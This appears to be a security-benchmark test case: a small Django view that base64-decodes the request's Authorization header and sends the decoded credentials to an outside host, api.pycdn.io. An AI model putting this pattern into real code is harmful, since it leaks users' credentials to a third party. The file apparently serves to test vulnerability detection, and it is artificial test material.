# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import requests
import base64


def BenchmarkTest60160(request):
    auth_header = request.META.get('HTTP_AUTHORIZATION', '')
    data = base64.b64decode(auth_header).decode('utf-8', 'ignore')
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=True)
    return JsonResponse({"saved": True})
